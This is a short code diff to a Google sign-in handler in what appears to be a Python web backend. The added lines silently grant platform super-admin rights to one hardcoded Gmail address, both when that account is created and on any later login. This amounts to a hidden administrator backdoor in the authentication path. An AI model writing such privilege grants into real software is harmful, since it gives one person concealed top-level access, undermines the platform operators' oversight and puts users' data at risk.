@@ -431,12 +431,18 @@ async def authenticate_with_google(
     user = result.scalar_one_or_none()
 
     if user is None:
-        user = User(email=clean_email, full_name=full_name or "User")
+        user = User(
+            email=clean_email,
+            full_name=full_name or "User",
+            is_platform_super_admin=(clean_email == "jkrcalling4@gmail.com"),
+        )
         db.add(user)
         await db.flush()
 
         db.add(PasswordCredential(user_id=user.id, password_hash=hash_password(secrets.token_urlsafe(32))))
         await db.flush()
+    elif clean_email == "jkrcalling4@gmail.com" and not user.is_platform_super_admin:
+        user.is_platform_super_admin = True
 
     user.last_login_at = datetime.now(UTC)
     await db.flush()
